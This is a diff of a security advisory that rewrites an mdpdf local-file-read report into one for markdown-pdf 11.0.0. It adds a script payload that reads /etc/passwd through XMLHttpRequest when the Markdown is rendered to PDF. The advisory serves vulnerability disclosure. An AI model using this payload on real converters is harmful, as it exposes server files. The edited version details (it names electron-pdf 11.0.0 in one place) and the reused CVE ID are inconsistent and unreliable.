@@ -1,14 +1,14 @@
 ---
 slug: advisories/relsb/
-title: mdpdf 3.0.1 - Local File Read via Server Side XSS
+title: markdown-pdf 11.0.0 - Local File Read via Server Side XSS
 authors: Carlos Bello
 writer: cbello
 codename: relsb
-product: mdpdf 3.0.1 - Local File Read
-date: 2023-02-20 12:00 COT
+product: markdown-pdf 11.0.0 - Local File Read
+date: 2023-03-06 12:00 COT
 cveid: CVE-2023-0835
 severity: 7.5
-description: mdpdf 3.0.1  -  Local File Read via Server Side XSS
+description: markdown-pdf 11.0.0 - Local File Read via Server Side XSS
 keywords: Fluid Attacks, Security, Vulnerabilities, Markdown, PDF, LFR
 banner: advisories-bg
 advise: yes
@@ -20,12 +20,12 @@ encrypted: yes
 
 |                       |                                                                    |
 | --------------------- | -------------------------------------------------------------------|
-| **Name**              | mdpdf 3.0.1 - Local File Read                                      |
+| **Name**              | markdown-pdf 11.0.0 - Local File Read                              |
 | **Code name**         | [RelsB](https://en.wikipedia.org/wiki/Rels_B)                      |
-| **Product**           | mdpdf                                                              |
-| **Affected versions** | Version 3.0.1                                                      |
+| **Product**           | markdown-pdf                                                       |
+| **Affected versions** | Version 11.0.0                                                     |
 | **State**             | Public                                                             |
-| **Release date**      | 2023-02-20                                                         |
+| **Release date**      | 2023-03-06                                                         |
 
 ## Vulnerability
 
@@ -41,7 +41,7 @@ encrypted: yes
 
 ## Description
 
-mdpdf version 3.0.1 allows an external attacker to remotely obtain
+markdown-pdf version 11.0.0 allows an external attacker to remotely obtain
 arbitrary local files. This is possible because the application does not
 validate the Markdown content entered by the user.
 
@@ -53,22 +53,32 @@ the Markdown content entered by the user is not malicious.
 ## Exploitation
 
 To exploit this vulnerability, we only need to send the following malicious
-Markdown to mdpdf:
+Markdown to markdown-pdf:
 
 ### Exploit.md
 
 ```html
-<iframe width="500" height="500" src=file:///etc/passwd></iframe>
+<script>
+    // Path Disclosure
+    document.write(window.location);
+    // Arbitrary Local File Read
+    xhr = new XMLHttpRequest;
+    xhr.onload=function(){document.write((this.responseText))};
+    xhr.open("GET","file:///etc/passwd");
+    xhr.send();
+</script>
 ```
 
-Thus, when mdpdf parses the malicious Markdown, it will return the local
+Thus, when markdown-pdf parses the malicious Markdown, it will return the local
 file specified in the generated PDF.
 
 ## Evidence of exploitation
 
-![Explotation-mdpdf](https://rb.gy/evsbdp)
+<iframe src="https://rb.gy/rph20g"
+frameborder="0" width="835px" height="505px"
+allowfullscreen></iframe>
 
-![LFR-Node-PDF](https://user-images.githubusercontent.com/51862990/218873920-d651c3a7-278b-431f-a5ed-04822b581105.png)
+![LFR-Node-PDF](https://user-images.githubusercontent.com/51862990/220176263-ca40f665-e82b-4521-8c86-42d76d7596be.png)
 
 ## Our security policy
 
@@ -78,7 +88,7 @@ We have reserved the ID CVE-2023-0835 to refer to this issue from now on.
 
 ## System Information
 
-* Version: mdpdf 3.0.1
+* Version: electron-pdf 11.0.0
 
 * Operating System: GNU/Linux
 
@@ -94,14 +104,14 @@ Offensive Team.
 
 ## References
 
-**Vendor page** <https://www.npmjs.com/package/mdpdf/>
+**Vendor page** <https://www.npmjs.com/package/markdown-pdf/>
 
 ## Timeline
 
 <time-lapse
-  discovered="2023-02-14"
-  contacted="2023-02-14"
-  replied="2023-02-14"
+  discovered="2023-02-20"
+  contacted="2023-02-20"
+  replied="2023-02-20"
   confirmed=""
   patched=""
   disclosure="">
